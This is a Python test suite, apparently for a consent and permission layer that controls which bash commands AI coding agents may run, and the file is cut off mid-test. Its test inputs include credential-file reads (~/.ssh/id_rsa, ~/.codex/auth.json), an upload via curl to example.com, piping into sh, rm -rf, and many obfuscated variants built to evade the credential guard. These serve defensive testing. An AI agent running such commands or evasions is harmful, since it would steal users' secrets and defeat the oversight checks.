"""#439: reusable consent at the storage, parser and hook boundaries."""
from __future__ import annotations

import io
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import time
import unittest
import warnings
from unittest.mock import patch
from dataclasses import replace

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "scripts"))
import grants
import stage_permissions as sp
import command_permissions as cp

#: These cases model bash on POSIX paths: they run bash, create symlinks, or
#: embed `~`, `/`-rooted and host paths in shell source, where a Windows path's
#: backslashes are escapes. The Linux job runs them; Windows keeps the rest.
posix_shell = unittest.skipIf(os.name == "nt", "bash semantics on POSIX paths; covered by the Linux job")


class ConsentVariantsTests(unittest.TestCase):
    def approved(self, policy, command, regex=None, executor="claude", store=None, cwd=None):
        op = sp.operation("Bash", {"command": command}, policy, cwd)
        grant = (grants.make_pattern_grant(regex, policy.role, executor, "linux",
                 proposer="test agent", justification="read API contracts",
                 positive=[sp.normalized_command(op)], negative=["rm -rf /"])
                 if regex else grants.make_grant(op, executor, "linux"))
        if store:
            store.save("owner/repo", grant, grant.scopes[0], "allow")
        return replace(policy, command_permissions=({"operation": grant.operation, "decision": "allow"},)), grant

    @posix_shell
    def test_ac1_ac3_ac4_configured_variants_survive_dispatch(self):
        for role in ("resolve", "rereview"):
            with self.subTest(role=role), tempfile.TemporaryDirectory() as root:
                old, new = Path(root) / "old", Path(root) / "new"
                old.mkdir()
                new.mkdir()
                policy = sp.StagePolicy(role, tmpdir=str(old), rtk=True,
                                        test_command="pnpm run test:unit")
                op = sp.operation("Bash", {"command": "pnpm run test:unit"}, policy, root)
                grant = grants.make_grant(op, "claude", "linux")
                store = grants.ConsentStore(Path(root) / "consents.json")
                store.save("owner/repo", grant, grant.scopes[0], "allow")
                broker = grants.ConsentBroker("owner/repo", store=store, platform="linux")
                current = replace(policy, tmpdir=str(new), command_permissions=broker.command_entries("claude", role))
                for command in ("pnpm run test:unit", "rtk pnpm run test:unit",
                                "CACHE=$TMPDIR/cache pnpm run test:unit",
                                "rtk proxy CACHE=$TMPDIR/cache pnpm run test:unit > $TMPDIR/check.log",
                                "CACHE=$TMPDIR/cache rtk pnpm run test:unit 2> $TMPDIR/check.log"):
                    with self.subTest(command=command):
                        self.assertEqual("allow", sp.matching_answer("Bash", {"command": command}, current, root))
                        self.assertTrue(sp.check(command, current, cwd=root).allowed)

    @posix_shell
    def test_ac2_distinct_commands_still_ask(self):
        policy = sp.StagePolicy("resolve", tmpdir="/tmp/current", test_command="pnpm run test:unit")
        op = sp.operation("Bash", {"command": "pnpm run test:unit"}, policy)
        policy = replace(policy, command_permissions=({"operation": op, "decision": "allow"},))
        for command in ("pnpm run test:unit:host", "node --test", "DOCKER_CONFIG=$TMPDIR/config pnpm run test:unit",
                        "PATH=/tmp/bin pnpm run test:unit"):
            self.assertIsNone(sp.matching_answer("Bash", {"command": command}, policy, None))
            self.assertFalse(sp.check(command, policy).allowed)

    def test_ac2_question_names_exact_configured_command_and_answer_stops_it(self):
        policy = sp.StagePolicy("resolve", test_command="pnpm run test:unit")
        broker = grants.ConsentBroker("owner/repo", platform="linux")
        command = "pnpm run test:unit:host"
        request = cp.refused_operation([command], policy, broker, "claude")
        self.assertIsNotNone(request)
        grant = broker.operations[request["resource"]]
        scope = grant.scopes[0]
        asked = grants.question(grant, scope, role="resolve", blocker=request)
        self.assertIn("Configured command: pnpm run test:unit.", asked["prompt"])
        broker.apply_answer(grant, scope, "cycle")
        current = replace(policy, command_permissions=broker.command_entries("claude", "resolve"))
        self.assertTrue(sp.check(command, current).allowed)

    @posix_shell
    def test_rev003_unrelated_questions_do_not_name_configured_test(self):
        policy = sp.StagePolicy("resolve", test_command="pnpm run test:unit",
                                verify_prefixes=("python3 scripts/validate-package.py",))
        for command, expected in (("cat /outside/api/" + "contract" * 10 + ".json", None),
                                  ("rtk pnpm run test:unit:host", policy.test_command),
                                  ("CACHE=/tmp/value python3 scripts/other.py", policy.verify_prefixes[0])):
            broker = grants.ConsentBroker("owner/repo", platform="linux")
            request = cp.refused_operation([command], policy, broker, "claude")
            self.assertEqual(expected, request.get("configured_command"))
            grant = broker.operations[request["resource"]]
            asked = grants.question(grant, grant.scopes[0], role="resolve", blocker=request)
            self.assertIn(command, asked["prompt"])
            if expected is None:
                self.assertNotIn("Configured command:", asked["prompt"])

    @posix_shell
    def test_ac3_all_operands_relative_paths_and_symlink_membership(self):
        with tempfile.TemporaryDirectory() as root:
            old, new, other = [Path(root) / name for name in ("old", "new", "other")]
            for path in (old, new, other):
                path.mkdir()
            (new / "escape").symlink_to(other, target_is_directory=True)
            first = sp.StagePolicy("resolve", tmpdir=str(old))
            second = replace(first, tmpdir=str(new))
            def operation(policy, path):
                return sp.operation("Bash", {"command": "custom-check " + str(path)}, policy, root)
            self.assertEqual(operation(first, old / "result"), operation(second, new / "result"))
            self.assertEqual(operation(first, old), operation(second, new))
            self.assertEqual(operation(second, "./new/result"), operation(second, new / "result"))
            self.assertNotEqual(operation(second, old / "result"), operation(second, new / "result"))
            self.assertNotEqual(operation(second, new / "escape/result"), operation(second, new / "result"))
            first = replace(first, attempt_id="attempt-old")
            second = replace(second, attempt_id="attempt-new")
            self.assertEqual(operation(first, old / "attempt-old.log"), operation(second, new / "attempt-new.log"))
            def shell(policy, path):
                return sp.operation("Bash", {"command": "cat " + str(path) + " | head"}, policy, root)
            self.assertEqual(shell(first, old / "result"), shell(second, new / "result"))

    @posix_shell
    def test_ac5_ac9_pattern_survives_scope_and_dispatch_and_revocation(self):
        for role in ("resolve", "rereview"):
            for scope in ("cycle", "persistent", "forever"):
                if role == "rereview" and scope == "forever":
                    continue
                with self.subTest(role=role, scope=scope), tempfile.TemporaryDirectory() as root:
                    store = grants.ConsentStore(Path(root) / "consents.json")
                    policy = sp.StagePolicy(role, tmpdir=root)
                    grant = grants.make_pattern_grant(r"(?:ls|cat|grep) [-a-zA-Z0-9 ]*/outside/api[/a-zA-Z0-9_.-]*",
                        role, "claude", "linux", proposer="agent", justification="inspect contracts",
                        positive=["ls /outside/api"], negative=["cat /outside/secrets"])
                    broker = grants.ConsentBroker("owner/repo", store=store, platform="linux", cycle_id="one", task_id="439")
                    broker.operations[grant.id] = grant
                    broker.apply_answer(grant, grant.scopes[0], scope)
                    resumed = grants.ConsentBroker("owner/repo", store=store, platform="linux", cycle_id="one", task_id="439")
                    policy = replace(policy, command_permissions=resumed.command_entries("claude", role))
                    for command in ("ls /outside/api/", "ls -la /outside/api", "cat /outside/api/contracts.json", "grep -n schema /outside/api/v1"):
                        self.assertTrue(sp.check(command, policy).allowed, command)
                    self.assertTrue(store.list("owner/repo"))
                    storage_scope = broker.cycle_scope if scope == "cycle" else "*" if scope == "forever" else "owner/repo"
                    store.record_execution(storage_scope, grant, grant.scopes[0], "ls /outside/api/")
                    entry = store.list("owner/repo")[0]
                    self.assertEqual("agent", entry["operation"]["proposer"])
                    self.assertEqual("allow", entry["user_approval"]["decision"])
                    self.assertEqual("ls /outside/api/", entry["executed_commands"][0]["command"])
                    self.assertTrue(store.revoke(storage_scope, grant, grant.scopes[0]))
                    self.assertFalse(resumed.command_entries("claude", role))

    def test_ac6_invalid_patterns_are_rejected_with_reason(self):
        for regex, reason in (("", "empty"), ("[", "invalid"), (".*", "empty command"),
                              ("(a+)+b", "nested"), ("(a|aa)+b", "alternatives")):
            with self.subTest(regex=regex), self.assertRaisesRegex(grants.GrantError, reason):
                grants.validate_pattern(regex, ["ab"], ["other"])
        for positive, negative, reason in ((["cat /no"], ["rm /x"], "positive"),
                                            (["ls /x"], ["ls /x"], "negative")):
            with self.assertRaisesRegex(grants.GrantError, reason):
                grants.validate_pattern(r"ls /x", positive, negative)
        self.assertFalse(grants.pattern_matches(".+", "a" * 4097))

    def test_ac7_patterns_cover_interpreters_and_warn_about_guards(self):
        policy, grant = self.approved(sp.StagePolicy("resolve"), "python3 -c 'print(1)'", r"python3 -c .+")
        self.assertTrue(sp.check("python3 -c 'print(2)'", policy).allowed)
        self.assertIn("interpreter", grant.scopes[0].risks.lower())
        self.assertIn("protected command", grant.scopes[0].risks)
        record = grants.PermissionRequest(grant, grant.scopes[0], "resolve", {}).record()
        self.assertEqual(["python3 -c print(1)"], record["pattern"]["positive"])
        self.assertIn("Bash(*)", sp.allowed_tool_patterns(policy))

    @posix_shell
    def test_ac8_compound_consent_guards_every_segment_and_does_not_extend(self):
        with tempfile.TemporaryDirectory() as root:
            policy = sp.StagePolicy("resolve", tmpdir=root)
            command = "printf hello | cat"
            parsed = sp.parse_command(command, root)
            self.assertEqual([["printf", "hello"], ["cat"]], [item.words for item in parsed.segments])
            self.assertFalse(sp.check(command, policy).allowed)
            current, _ = self.approved(policy, command)
            self.assertTrue(sp.check(command, current).allowed)
            self.assertFalse(sp.check("printf hello | cat; rm file", current).allowed)
            single, _ = self.approved(policy, "printf hello")
            self.assertFalse(sp.check(command, single).allowed)
            for command in ("printf x | git push --force origin main", "echo $(git push --force origin main)",
                            "if true; then git push --force origin main; fi",
                            "for x in a; do git push --force origin main; done",
                            "{ git push --force origin main; }",
                            "echo ${x:-$(git push --force origin main)}",
                            "cat <<EOF > /outside/file\ndata\nEOF",
                            "cat <<EOF\n$(git push --force origin main)\nEOF",
                            "echo `git push --force origin main`", "cat <(git push --force origin main)",
                            "printf x | cat ~/.codex/auth.json", "cat $HOME/.codex/auth.json",
                            "cd ~/.codex; cat auth.json",
                            "printf x | cat > /outside/file"):
                with self.subTest(command=command):
                    current, _ = self.approved(policy, command)
                    self.assertIsNotNone(sp.protected_reason("Bash", {"command": command}, current, root))
                    self.assertFalse(sp.check(command, current, cwd=root).allowed)

    @posix_shell
    def test_ac8_shared_hook_with_claude_grant_metadata(self):
        self.shell_baselines_and_guarded_execution("claude")

    @posix_shell
    def test_ac8_shared_hook_with_codex_grant_metadata(self):
        self.shell_baselines_and_guarded_execution("codex")

    def shell_baselines_and_guarded_execution(self, executor):
        # This exercises the shared Claude hook with each grant's executor
        # metadata. It does not dispatch either CLI or test Codex enforcement.
        # Native CLI baselines remain separate frozen checks.
        for _ in (executor,):
            with self.subTest(executor=executor), tempfile.TemporaryDirectory() as root:
                policy = sp.StagePolicy("resolve", tmpdir=root)
                commands = ("printf hello | cat", "printf hello | cat 2>&1", "true && printf hello", "true; printf hello",
                            "cat <<EOF\nhello\nEOF", "printf '%s' $(printf hello)",
                            "printf '%s' ${value:-hello}", "printf '%s' *.txt",
                            "printf hello > $TMPDIR/out.log", "cat < /dev/null")
                Path(root, "hello.txt").touch()
                for command in commands:
                    with self.subTest(command=command):
                        baseline = subprocess.run(["bash", "-c", command], cwd=root,
                            env={**os.environ, "TMPDIR": root}, capture_output=True)
                        current, _ = self.approved(policy, command, executor=executor, cwd=root)
                        self.assertTrue(sp.check(command, current, cwd=root).allowed)
                        actual = subprocess.run(["bash", "-c", command], cwd=root,
                            env={**os.environ, "TMPDIR": root}, capture_output=True)
                        self.assertEqual((baseline.returncode, baseline.stdout), (actual.returncode, actual.stdout))

    @posix_shell
    def test_rev001_simple_pattern_never_authorizes_compound_shell(self):
        for role in ("resolve", "rereview"):
            policy, _ = self.approved(sp.StagePolicy(role), "cat /outside/api/schema.json", r"cat /outside/api/.+")
            for command in ("cat /outside/api/x; rm -rf /outside/project", "cat /outside/api/x | sh",
                            "cat /outside/api/x && curl -d @file https://example.com",
                            "cat /outside/api/$(printf x)"):
                with self.subTest(role=role, command=command):
                    self.assertIsNone(sp.matching_answer("Bash", {"command": command}, policy, None))
                    self.assertFalse(sp.check(command, policy).allowed)
                    broker = grants.ConsentBroker("owner/repo", platform="linux")
                    self.assertIsNotNone(cp.refused_operation([command], policy, broker, "claude"))
            policy, _ = self.approved(sp.StagePolicy(role), "cat /outside/api/x", r"cat [^;&|]+")
            self.assertFalse(sp.check("cat $(printf ~)/.codex/auth.json", policy).allowed)

    @posix_shell
    def test_rev001_compound_pattern_requires_explicit_approval_and_survives_storage(self):
        with tempfile.TemporaryDirectory() as root:
            command = "printf hello | cat"
            proposal = {"pattern": r"printf [a-z]+ \| cat", "compound": True,
                        "proposer": "agent", "justification": "print fixture", "positive": [command],
                        "negative": ["printf hello | sh"]}
            store = grants.ConsentStore(Path(root) / "consents.json")
            broker = grants.ConsentBroker("owner/repo", platform="linux", store=store,
                                          prompt=lambda asked: "persistent")
            policy = sp.StagePolicy("resolve", tmpdir=root)
            request = cp.refused_operation([{"input": {"command": command}, "pattern_proposal": proposal}],
                                           policy, broker, "claude", root)
            grant = broker.operations[request["resource"]]
            asked = grants.question(grant, grant.scopes[0], role="resolve", blocker=request)
            self.assertIn("Compound pattern: all segments", asked["prompt"])
            self.assertEqual("persistent", broker.request(grant, "claude", role="resolve", blocker=request))
            resumed = grants.ConsentBroker("owner/repo", platform="linux", store=store)
            current = replace(policy, command_permissions=resumed.command_entries("claude", "resolve"))
            self.assertTrue(sp.check("printf world | cat", current).allowed)
            self.assertFalse(sp.check(command + "; rm file", current).allowed)
            broker.record_executions([command], "claude", current, root)
            self.assertEqual(command, store.list("owner/repo")[0]["executed_commands"][0]["command"])

    def test_rev001_long_regex_keeps_compound_warning_visible(self):
        command = "printf hello | cat"
        regex = r"printf hello \| cat" + "(?:)" * 210
        grant = grants.make_pattern_grant(regex, "resolve", "claude", "linux", compound=True,
            proposer="agent", justification="print fixture", positive=[command], negative=["rm x"])
        asked = grants.question(grant, grant.scopes[0], role="resolve", blocker={"command": command})
        self.assertIn("Compound pattern: all segments", asked["prompt"])
        self.assertIn("never bypass Git, credential or redirect guards", asked["prompt"])
        self.assertIn("Interpreter internals require external isolation", asked["prompt"])
        self.assertLessEqual(len(asked["prompt"]), 600)
        self.assertEqual(regex, grants.PermissionRequest(grant, grant.scopes[0], "resolve", asked).record()["pattern"]["pattern"]["regex"])

    @posix_shell
    def test_rev002_credentials_guard_cwd_options_stack_and_globs(self):
        policy = sp.StagePolicy("resolve")
        commands = ("cd -P ~/.codex && cat auth.json", "cd -L -- ~/.codex; cat auth.json",
                    "pushd ~/.codex; cat auth.json", "pushd ~/.ssh; cat id_rsa",
                    "cd ~/.codex; pushd /outside/api; popd; cat auth.json",
                    "cd ~/.codex; cd /outside/api; cd -; cat auth.json",
                    "cd ~/.codex; pushd -n /outside/api; cat auth.json",
                    "pushd /outside/api; cd ~/.codex; popd -n; cat auth.json",
                    "cd ~/.codex; (cd /outside/api); cat auth.json",
                    "cd ~/.codex; false && cd /outside/api; cat auth.json",
                    "cd $target; cat auth.json", "pushd +1; cat auth.json", "popd; cat auth.json",
                    "cat ~/.codex/auth*", "cat ~/.ss?/id_rsa", "cat ~/.codex/[a]uth.json",
                    "cat ~/.codex/{auth.json,other}", "cat ~/.codex/{auth.json,{other,foo}}")
        for command in commands:
            with self.subTest(command=command):
                current, _ = self.approved(policy, command)
                self.assertIsNotNone(sp.protected_reason("Bash", {"command": command}, current, None))
                self.assertFalse(sp.check(command, current).allowed)
        safe = "cd -P /outside/api; cat schema.json"
        current, _ = self.approved(policy, safe)
        self.assertTrue(sp.check(safe, current).allowed)
        command = "false && cd /outside/api; cd .codex; cat auth.json"
        current, _ = self.approved(policy, command)
        self.assertFalse(sp.check(command, current, cwd=str(Path.home())).allowed)

    @posix_shell
    def test_rev002_logical_cd_dotdot_retains_protected_directory(self):
        with tempfile.TemporaryDirectory() as root:
            protected = Path(root, "logical/.codex")
            protected.mkdir(parents=True)
            safe = Path(root, "safe/child")
            safe.mkdir(parents=True)
            (protected / "link").symlink_to(safe, target_is_directory=True)
            command = "cd -L " + str(protected / "link") + "/..; cat auth.json"
            policy, _ = self.approved(sp.StagePolicy("resolve", tmpdir=root), command)
            with patch.object(sp, "CREDENTIAL_STORES", (str(protected / "auth.json"),)):
                self.assertFalse(sp.check(command, policy, cwd=root).allowed)

    @posix_shell
    def test_rev002_glob_keeps_symlinked_credential_store_spelling(self):
        with tempfile.TemporaryDirectory() as root:
            protected = Path(root, "auth.json")
            protected.symlink_to(Path(root, "token-store"))
            command = "cat " + str(Path(root, "auth*"))
            policy, _ = self.approved(sp.StagePolicy("resolve", tmpdir=root), command)
            with patch.object(sp, "CREDENTIAL_STORES", (str(protected),)):
                self.assertFalse(sp.check(command, policy, cwd=root).allowed)

    @posix_shell
    def test_rev006_unresolved_directory_asks_for_non_credential_operands(self):
        for role in ("resolve", "rereview"):
            with self.subTest(role=role), tempfile.TemporaryDirectory() as root:
                policy = sp.StagePolicy(role, tmpdir=root)
                for command in ('cd "$X" && echo done', 'cd "$REPO_ROOT" && make test',
                                'cd "$(git rev-parse --show-toplevel)" && pytest tests',
                                "builtin cd $X; ls -la", 'cd "$X" && cat *.py',
                                'cd "$REPO_ROOT" && make build', 'cd "$X" && pytest config/tests',
                                'cd "$X" && cat config/settings.py', 'cd "$X" && make VAR=x test'):
                    with self.subTest(command=command):
                        self.assertIsNone(sp.protected_reason("Bash", {"command": command}, policy, root))
                        self.assertTrue(sp.unresolved_directory(command, policy, root))
                        decision = sp.check(command, policy, cwd=root)
                        self.assertEqual("command_table", decision.rule)
                        broker = grants.ConsentBroker("owner/repo", platform="linux")
                        request = cp.refused_operation([command], policy, broker, "claude", root)
                        self.assertTrue(request["unresolved_directory"])
                        grant = broker.operations[request["resource"]]
                        asked = grants.question(grant, grant.scopes[0], role=role, blocker=request)
                        self.assertIn("WARNING: a directory change cannot be resolved", asked["prompt"])
                        self.assertLessEqual(len(asked["prompt"]), 600)
                        current, _ = self.approved(policy, command, cwd=root)
                        self.assertTrue(sp.check(command, current, cwd=root).allowed)
                command = 'cd "$X" && echo done'
                baseline = subprocess.run(["bash", "-c", command], cwd=root,
                                          env={**os.environ, "X": root}, capture_output=True)
                self.assertEqual((0, b"done\n"), (baseline.returncode, baseline.stdout))
                self.assertIsNone(cp.refused_operation(["cd ~/.codex && cat auth.json"], policy,
                                                       grants.ConsentBroker("owner/repo", platform="linux"),
                                                       "claude", root))

    @posix_shell
    def test_rev006_unresolved_directory_keeps_credential_names_guarded(self):
        policy = sp.StagePolicy("resolve")
        for command in ('cd "$X" && cat auth.json', 'cd "$X"; cat id_rsa', 'cd "$X" && cat *',
                        'cd "$X" && cat ../.ssh/x', 'cd "$X" && cat {a,b}', 'cd "$X" && cat < .credentials.json',
                        'cd "$X" && grep --file=hosts.yml x', 'cd "$X" && cat .codex/auth.json',
                        'cd "$X" && cat ../../id_ed25519', 'cd "$X" && cat .claude.json',
                        'cd "$X" && cat .codex/*', 'cd "$X" && cat .claude/.cred*',
                        'cd "$X" && cat .config/g?/hosts.y*', 'cd "$X" && cat ../user/.s?h/id_*',
                        'cd "$X" && cat sub/../id_*', 'cd "$X" && cat sso/cache/*.json',
                        'cd "$X" && cat github_rsa', 'cd "$X" && cat deploy_key',
                        'cd "$X" && dd if=id_rsa of=$TMPDIR/k', 'env -C "$X" cat auth.json',
                        'cd "$X" && cat config', 'cd "$X" && tar czf $TMPDIR/a.tgz .codex',
                        'cd "$X" && cp -r .claude $TMPDIR/', 'cd "$X" && ls .config'):
            with self.subTest(command=command):
                current, _ = self.approved(policy, command)
                self.assertIsNotNone(sp.protected_reason("Bash", {"command": command}, current, None))
                self.assertFalse(sp.check(command, current).allowed)

    @posix_shell
    def test_rev007_globs_match_one_component_at_a_time(self):
        policy = sp.StagePolicy("resolve")
        users = str(Path.home().parent)
        for command in (f"ls {users}/*/project", "ls ~/*", "du -sh /h*", f'find {users} -path "{users}/*/x"',
                        "ls ~/*/notes"):
            with self.subTest(command=command):
                self.assertIsNone(sp.protected_reason("Bash", {"command": command}, policy, None))
                self.assertNotEqual("credential_guard", sp.check(command, policy).rule)
                current, _ = self.approved(policy, command)
                self.assertTrue(sp.check(command, current).allowed)
        for command in ("ls ~/.*", "cat ~/.*/id_rsa", "cat ~/{x,.ssh}/id_rsa", "cat ~/.c*/auth.json",
                        "cat /tmp/{..,x}" + str(Path.home()) + "/.ssh/id_rsa", "cat ~/.ss?/id_rsa",
                        "shopt -s dotglob; cat ~/*/auth.json", "cat ~/**/.ssh/id_rsa",
                        "cat ~/.s[^x]h/id_rsa", "cat ~/.codex/aut[[:alpha:]].json", "cat {~/.ssh,x}/id_rsa",
                        f"diff --from-file={Path.home()}/.ssh/id_rsa /dev/null", "tar -C~/.ssh -cf x y"):
            with self.subTest(command=command):
                current, _ = self.approved(policy, command)
                self.assertIsNotNone(sp.protected_reason("Bash", {"command": command}, current, None))
                self.assertFalse(sp.check(command, current).allowed)
        with patch.dict(os.environ, {"BASHOPTS": "checkwinsize:dotglob"}):
            self.assertIsNotNone(sp.protected_reason("Bash", {"command": "cat ~/*/auth.json"}, policy, None))
        with patch.dict(os.environ, {"BASHOPTS": "checkwinsize", "GLOBIGNORE": ""}):
            self.assertIsNone(sp.protected_reason("Bash", {"command": "cat ~/*/auth.json"}, policy, None))

    @posix_shell
    def test_rev007_deep_globstar_fails_closed_quickly(self):
        policy = sp.StagePolicy("resolve")
        command = "cat /" + "**/" * 990 + "x"
        started = time.monotonic()
        self.assertIsNone(sp.protected_reason("Bash", {"command": command}, policy, None))
        cp.refused_operation([command], policy, grants.ConsentBroker("owner/repo", platform="linux"), "claude")
        self.assertLess(time.monotonic() - started, 10)

    @posix_shell
    def test_rev007_glob_characters_in_working_directory_are_literal(self):
        with tempfile.TemporaryDirectory() as root:
            cwd = Path(root, "a[b]*", "child")
            cwd.mkdir(parents=True)
            policy = sp.StagePolicy("resolve", tmpdir=root)
            for command in ("ls ..", "cat ../README.md", "cat ./notes.txt"):
                with self.subTest(command=command):
                    self.assertIsNone(sp.protected_reason("Bash", {"command": command}, policy, str(cwd)))

    @posix_shell
    def test_rev008_builtin_command_and_cdpath_directory_changes_are_guarded(self):
        policy = sp.StagePolicy("resolve")
        for command in ("builtin cd ~/.codex; cat auth.json", "command cd ~/.ssh && cat id_rsa",
                        "command -p cd ~/.codex; cat auth.json", "builtin pushd ~/.codex; cat auth.json",
                        "command -- cd ~/.codex; cat auth.json", "builtin cd -P ~/.ssh; cat config",
                        "CDPATH=~ cd .codex; cat auth.json", "export CDPATH=~; cd .codex; cat auth.json",
                        "CDPATH=~ pushd .ssh; cat known_hosts", 'eval "cd ~/.codex"; cat auth.json',
                        "source ./env.sh; cat auth.json", "builtin eval 'cd ~/.codex'; cat auth.json",
                        "command source ./x.sh; cat auth.json", "trap 'cd ~/.codex' DEBUG; cat auth.json",
                        "env -C ~/.claude cat .credentials.json", "env --chdir=$HOME/.codex cat auth.json",
                        "env -C ~/.ssh cat id_rsa", "true; env --chdir ~/.codex cat auth.json",
                        "env -vC ~/.claude cat .credentials.json", "env -iC~/.codex cat auth.json",
                        "env --chd=$HOME/.codex cat auth.json", "env --chd ~/.codex cat auth.json"):
            with self.subTest(command=command):
                current, _ = self.approved(policy, command)
                self.assertIsNotNone(sp.protected_reason("Bash", {"command": command}, current, None))
                self.assertFalse(sp.check(command, current).allowed)
        for safe in ("command -v cd; cat schema.json", "env -C /outside/api cat schema.json"):
            current, _ = self.approved(policy, safe)
            self.assertTrue(sp.check(safe, current).allowed)
        with patch.dict(os.environ, {"CDPATH": str(Path.home())}):
            command = "cd .codex; cat auth.json"
            current, _ = self.approved(policy, command)
            self.assertFalse(sp.check(command, current).allowed)
            command = "cd sub && make build"
            self.assertIsNone(sp.protected_reason("Bash", {"command": command}, policy, None))

    @posix_shell
    def test_rev008_env_options_and_reassigned_home_or_oldpwd_are_guarded(self):
        policy = sp.StagePolicy("resolve")
        for command in ('env --c="$X" cat id_rsa', "env --c=$HOME/.codex cat auth.json",
                        'env -uLC_ALL -C "$X" cat id_rsa', "env -iu LC_ALL -C ~/.ssh cat id_rsa",
                        "env - -C ~/.codex cat auth.json", "env --u LC_ALL --chdir ~/.ssh cat id_rsa",
                        'HOME="$X" cd; cat id_rsa', 'export HOME="$X"; cd ~; cat auth.json',
                        'export HOME="$X"; cd $HOME; cat auth.json', 'printf -v HOME %s "$X"; cd; cat id_rsa',
                        "read -r HOME; cd; cat id_rsa", 'cd /tmp; export OLDPWD="$X"; cd -; cat id_rsa',
                        'env "-S-C $X" cat id_rsa', 'env -S "-C $X" cat id_rsa',
                        'env --split-string="--chdir=$X" cat id_rsa', "env '-S-i\\_-C\\_${X}' cat id_rsa",
                        'declare "HO""ME=$X"; cd; cat id_rsa'):
            with self.subTest(command=command):
                current, _ = self.approved(policy, command)
                self.assertIsNotNone(sp.protected_reason("Bash", {"command": command}, current, None))
                self.assertFalse(sp.check(command, current).allowed)
        for safe in ("env -u LC_ALL cat schema.json", "env -uLC_ALL cat schema.json", "cd /tmp; cd -; ls",
                     'env -S "perl -w" cat schema.json', 'cd "${HOME}/proj" && cat schema.json'):
            with self.subTest(command=safe):
                self.assertIsNone(sp.protected_reason("Bash", {"command": safe}, policy, None))

    @posix_shell
    def test_rev009_tilde_prefixes_name_what_bash_reads(self):
        import pwd
        entry = pwd.getpwuid(os.getuid())
        for role in ("resolve", "rereview"):
            policy = sp.StagePolicy(role)
            with self.subTest(role=role), patch.dict(os.environ, {"HOME": entry.pw_dir}):
                for command in (f"cat ~{entry.pw_name}/.ssh/id_rsa", "cd ~ && cat ~+/.ssh/id_rsa",
                                "cd ~/x; cd /tmp; cat ~-/../.ssh/id_rsa", 'cd "$X" && cat ~+/id_rsa',
                                "cat ~-/.ssh/id_rsa", "cat ~2/.codex/auth.json", "cat ~+1/id_rsa",
                                "cd ~-; cat id_rsa", "cd ~ && cd ~+/.ssh; cat id_rsa","env -C ~- cat id_rsa",
                                "export PWD=~; cat ~+/.ssh/id_rsa", "cat < ~-/.ssh/id_rsa",
                                f"cd ~{entry.pw_name}/.codex && cat auth.json", "cat ~{,}/.ssh/id_rsa",
                                "cat ~{+,}/.codex/auth.json", "cat ~{a,}/.ssh/id_rsa"):
                    with self.subTest(command=command):
                        current, _ = self.approved(policy, command)
                        self.assertIsNotNone(sp.protected_reason("Bash", {"command": command}, current, None))
                        self.assertFalse(sp.check(command, current).allowed)
                for command in ("cat ~+/README.md", "cat ~-/notes.txt", "cd ~-; ls", f"ls ~{entry.pw_name}/projects"):
                    with self.subTest(command=command):
                        self.assertIsNone(sp.protected_reason("Bash", {"command": command}, policy, None))
                        current, _ = self.approved(policy, command)
                        self.assertTrue(sp.check(command, current).allowed)
                for command in ("cat ~-/notes.txt", "cd ~-; ls"):
                    self.assertTrue(sp.unresolved_directory(command, policy))
                self.assertFalse(sp.unresolved_directory("cat ~+/README.md", policy))

    @posix_shell
    def test_rev010_env_chdir_behind_command_and_runners_is_guarded(self):
        policy = sp.StagePolicy("resolve")
        for command in ('command env -C "$X" cat id_rsa', 'nice env -C "$X" cat id_rsa',
                        'timeout 5 env -C "$X" cat id_rsa', "nohup env -C ~/.ssh cat id_rsa",
                        "command env --chdir ~/.codex cat auth.json", "nice -n 5 /usr/bin/env -C ~/.ssh cat id_rsa",
                        f"timeout -s KILL 5 env -C {Path.home()} cat .codex/auth.json",
                        'stdbuf -o L env -C "$X" cat id_rsa', "sudo -u root env -C ~/.ssh cat id_rsa",
                        'xargs -a /dev/null env -C "$X" cat id_rsa', "exec -a name env -C ~/.ssh cat id_rsa"):
            with self.subTest(command=command):
                current, _ = self.approved(policy, command)
                self.assertIsNotNone(sp.protected_reason("Bash", {"command": command}, current, None))
                self.assertFalse(sp.check(command, current).allowed)
        for safe in ("nice env -C /outside/api cat schema.json", "command env -C /outside/api cat schema.json",
                     'echo env -C "$X" id_rsa', 'grep env -C "$N" config'):
            with self.subTest(command=safe):
                self.assertIsNone(sp.protected_reason("Bash", {"command": safe}, policy, None))
                current, _ = self.approved(policy, safe)
                self.assertTrue(sp.check(safe, current).allowed)

    @posix_shell
    def test_rev011_decoded_settings_cannot_hide_credential_reads(self):
        commands = ("shopt -s dot\\\nglob; cat ~/*/id_rsa",
                    'shopt -s "dot""glob"; cat ~/*/id_rsa',
                    "shopt -s $'\\x64otglob'; cat ~/*/id_rsa",
                    "CD\\\nPATH=~ cd .ssh; cat id_rsa",
                    'export "CD""PATH=~"; cd .ssh; cat id_rsa',
                    'HO\\\nME="$X" cd; cat id_rsa',
                    'cd /tmp; export "OLD""PWD=$X"; cd -; cat id_rsa',
                    'export "GLOB""IGNORE=x"; cat ~/*/id_rsa',
                    'export "P""WD=$X"; cat ~+/id_rsa',
                    'declare "$n=$X"; cd .ssh; cat id_rsa',
                    'read "$n"; cd -; cat id_rsa',
                    'printf -v "$n" %s "$X"; cat ~/*/id_rsa')
        for role in ("resolve", "rereview"):
            policy = sp.StagePolicy(role)
            grant = grants.make_pattern_grant(r".+", role, "claude", "linux", compound=True,
                proposer="test", justification="exercise retained guards",
                positive=["printf hello | cat"], negative=["\n"])
            current = replace(policy, command_permissions=({"operation": grant.operation, "decision": "allow"},))
            for command in commands:
                with self.subTest(role=role, command=command):
                    self.assertIsNotNone(sp.protected_reason("Bash", {"command": command}, current, None))
                    self.assertIsNone(sp.matching_answer("Bash", {"command": command}, current, None))
                    self.assertFalse(sp.check(command, current).allowed)
            for command in ('export "CD""PATH=~"; cd src; cat README.md',
                            'read "$n"; cd -; cat schema.json',
                            'shopt -s "dot""glob"; cat /outside/api/*.json'):
                with self.subTest(role=role, command=command):
                    self.assertIsNone(sp.protected_reason("Bash", {"command": command}, policy, None))
                    self.assertIsNotNone(cp.refused_operation([command], policy,
                        grants.ConsentBroker("owner/repo", platform="linux"), "claude"))
                    self.assertTrue(sp.check(command, current).allowed)

    @posix_shell
    def test_rev012_glob_options_keep_credential_guards(self):
        for role in ("resolve", "rereview"):
            policy = sp.StagePolicy(role)
            for command in ("shopt -s nocaseglob; cat ~/.SS?/id_rsa",
                            'shopt -s "nocase""glob"; cat ~/.CODE?/auth.json',
                            "shopt -s noca\\\nseglob; cat ~/.SS?/id_rsa",
